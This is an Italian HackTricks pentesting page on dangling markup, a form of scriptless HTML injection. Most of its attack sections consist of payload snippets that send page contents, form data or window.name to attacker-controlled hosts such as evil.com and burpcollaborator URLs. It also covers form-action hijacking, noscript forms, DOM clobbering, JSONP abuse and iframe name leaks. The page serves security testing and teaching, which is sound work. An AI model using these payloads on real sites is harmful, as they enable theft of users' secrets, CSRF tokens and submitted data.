# Dangling Markup - HTML scriptless injection

{{#include ../../banners/hacktricks-training.md}}

## Resume

Questa tecnica può essere utilizzata per estrarre informazioni da un utente quando viene trovata un'**iniezione HTML**. Questo è molto utile se **non trovi alcun modo per sfruttare un** [**XSS** ](../xss-cross-site-scripting/) ma puoi **iniettare alcuni tag HTML**.\
È anche utile se qualche **segreto è salvato in chiaro** nell'HTML e vuoi **esfiltrarlo** dal client, o se vuoi fuorviare l'esecuzione di qualche script.

Diverse tecniche commentate qui possono essere utilizzate per bypassare alcune [**Content Security Policy**](../content-security-policy-csp-bypass/) esfiltrando informazioni in modi inaspettati (tag html, CSS, tag meta http, moduli, base...).

## Main Applications

### Stealing clear text secrets

Se inietti `<img src='http://evil.com/log.cgi?` quando la pagina viene caricata, la vittima ti invierà tutto il codice tra il tag `img` iniettato e la prossima virgolette all'interno del codice. Se un segreto si trova in qualche modo in quel blocco, lo ruberai (puoi fare la stessa cosa usando una doppia virgoletta, dai un'occhiata a quale potrebbe essere più interessante da usare).

Se il tag `img` è vietato (a causa di CSP per esempio) puoi anche usare `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Nota che **Chrome blocca gli URL HTTP** con "<" o "\n" in essi, quindi potresti provare altri schemi di protocollo come "ftp".

Puoi anche abusare di CSS `@import` (invierà tutto il codice fino a trovare un ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Puoi anche usare **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Puoi anche inserire un `<base` tag. Tutte le informazioni verranno inviate fino a quando la citazione non sarà chiusa, ma richiede un'interazione da parte dell'utente (l'utente deve cliccare su un link, perché il tag base avrà cambiato il dominio indicato dal link):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Furto di moduli
```html
<base href="http://evil.com/" />
```
Quindi, i moduli che inviano dati al percorso (come `<form action='update_profile.php'>`) invieranno i dati al dominio malevolo.

### Furto di moduli 2

Imposta un'intestazione del modulo: `<form action='http://evil.com/log_steal'>` questo sovrascriverà l'intestazione del modulo successivo e tutti i dati del modulo saranno inviati all'attaccante.

### Furto di moduli 3

Il pulsante può cambiare l'URL dove le informazioni del modulo verranno inviate con l'attributo "formaction":
```html
<button name="xss" type="submit" formaction="https://google.com">
I get consumed!
</button>
```
Un attaccante può utilizzare questo per rubare le informazioni.

Trova un [**esempio di questo attacco in questo documento**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Rubare segreti in chiaro 2

Utilizzando la tecnica menzionata in precedenza per rubare i moduli (iniettando un nuovo header del modulo) puoi quindi iniettare un nuovo campo di input:
```html
<input type='hidden' name='review_body' value="
```
e questo campo di input conterrà tutto il contenuto tra le sue virgolette e la prossima virgoletta nel HTML. Questo attacco mescola "_**Stealing clear text secrets**_" con "_**Stealing forms2**_".

Puoi fare la stessa cosa iniettando un modulo e un `<option>` tag. Tutti i dati fino a quando non viene trovato un `</option>` chiuso verranno inviati:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Iniezione di parametri del modulo

Puoi cambiare il percorso di un modulo e inserire nuovi valori in modo che venga eseguita un'azione imprevista:
```html
<form action="/change_settings.php">
<input type="hidden" name="invite_user" value="fredmbogo" /> ← Injected lines

<form action="/change_settings.php">
← Existing form (ignored by the parser) ...
<input type="text" name="invite_user" value="" /> ← Subverted field ...
<input type="hidden" name="xsrf_token" value="12345" />
...
</form>
</form>
```
### Furto di segreti in chiaro tramite noscript

`<noscript></noscript>` È un tag il cui contenuto verrà interpretato se il browser non supporta javascript (puoi abilitare/disabilitare Javascript in Chrome in [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Un modo per esfiltrare il contenuto della pagina web dal punto di iniezione fino in fondo a un sito controllato dall'attaccante sarà iniettare questo:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassare CSP con interazione dell'utente

Da questa [ricerca di portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) puoi apprendere che anche dagli ambienti **più restrittivi di CSP** puoi comunque **esfiltrare dati** con un po' di **interazione dell'utente**. In questa occasione utilizzeremo il payload:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Nota che chiederai alla **vittima** di **cliccare su un link** che lo **reindirizzerà** a un **payload** controllato da te. Nota anche che l'attributo **`target`** all'interno del tag **`base`** conterrà **contenuto HTML** fino al prossimo apostrofo.\
Questo farà sì che il **valore** di **`window.name`** se il link viene cliccato sarà tutto quel **contenuto HTML**. Pertanto, poiché **controlli la pagina** a cui la vittima accede cliccando sul link, puoi accedere a quel **`window.name`** ed **esfiltrare** quei dati:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flusso di lavoro ingannevole 1 - attacco allo spazio dei nomi HTML

Inserisci un nuovo tag con un id all'interno dell'HTML che sovrascriverà il successivo e con un valore che influenzerà il flusso di uno script. In questo esempio stai selezionando con chi verrà condivisa un'informazione:
```html
<input type="hidden" id="share_with" value="fredmbogo" /> ← Injected markup ...
Share this status update with: ← Legitimate optional element of a dialog
<input id="share_with" value="" />

... function submit_status_update() { ... request.share_with =
document.getElementById('share_with').value; ... }
```
### Flusso di script fuorviante 2 - Attacco allo spazio dei nomi dello script

Crea variabili all'interno dello spazio dei nomi javascript inserendo tag HTML. Poi, questa variabile influenzerà il flusso dell'applicazione:
```html
<img id="is_public" /> ← Injected markup ... // Legitimate application code
follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
The subsequent assignment fails in IE is_public = true; else is_public = false;
} function submit_new_acls() { ... if (is_public) request.access_mode =
AM_PUBLIC; ← Condition always evaluates to true ... }
```
### Abuso di JSONP

Se trovi un'interfaccia JSONP, potresti essere in grado di chiamare una funzione arbitraria con dati arbitrari:
```html
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```
Oppure puoi anche provare a eseguire del javascript:
```html
<script src="/search?q=a&call=alert(1)"></script>
```
### Abuso di Iframe

Un documento figlio ha la capacità di visualizzare e modificare la proprietà `location` del suo genitore, anche in situazioni cross-origin. Questo consente di incorporare uno script all'interno di un **iframe** che può reindirizzare il client a una pagina arbitraria:
```html
<html>
<head></head>
<body>
<script>
top.window.location = "https://attacker.com/hacked.html"
</script>
</body>
</html>
```
Questo può essere mitigato con qualcosa come: `sandbox=' allow-scripts allow-top-navigation'`

Un iframe può anche essere abusato per leakare informazioni sensibili da una pagina diversa **utilizzando l'attributo name dell'iframe**. Questo perché puoi creare un iframe che si iframma da solo abusando dell'iniezione HTML che fa apparire le **informazioni sensibili all'interno dell'attributo name dell'iframe** e poi accedere a quel nome dall'iframe iniziale e leakarlo.
```html
<script>
function cspBypass(win) {
win[0].location = "about:blank"
setTimeout(() => alert(win[0].name), 500)
}
</script>

<iframe
src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27"
onload="cspBypass(this.contentWindow)"></iframe>
```
Per ulteriori informazioni controlla [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuso

Puoi usare **`meta http-equiv`** per eseguire **diverse azioni** come impostare un Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` o eseguire un reindirizzamento (in 5s in questo caso): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Questo può essere **evitato** con un **CSP** riguardante **http-equiv** ( `Content-Security-Policy: default-src 'self';`, o `Content-Security-Policy: http-equiv 'self';`)

### Nuovo \<portal tag HTML

Puoi trovare una **ricerca molto interessante** sulle vulnerabilità sfruttabili del tag \<portal [qui](https://research.securitum.com/security-analysis-of-portal-element/).\
Al momento della scrittura, devi abilitare il tag portal su Chrome in `chrome://flags/#enable-portals` o non funzionerà.
```html
<portal src='https://attacker-server?
```
### HTML Leaks

Non tutti i modi per rivelare la connettività in HTML saranno utili per Dangling Markup, ma a volte potrebbero aiutare. Controllali qui: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

Questo è un **mix** tra **dangling markup e XS-Leaks**. Da un lato, la vulnerabilità consente di **iniettare HTML** (ma non JS) in una pagina della **stessa origine** di quella che stiamo attaccando. Dall'altro lato, non **attaccheremo** direttamente la pagina in cui possiamo iniettare HTML, ma **un'altra pagina**.

{{#ref}}
ss-leaks.md
{{#endref}}

## XS-Search/XS-Leaks

XS-Search è orientato a **esfiltrare informazioni cross-origin** abusando di **attacchi a canale laterale**. Pertanto, è una tecnica diversa da Dangling Markup, tuttavia, alcune delle tecniche abusano dell'inclusione di tag HTML (con e senza esecuzione di JS), come [**CSS Injection**](../xs-search/#css-injection) o [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{{#ref}}
../xs-search/
{{#endref}}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

- [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
- [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
- [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{{#include ../../banners/hacktricks-training.md}}
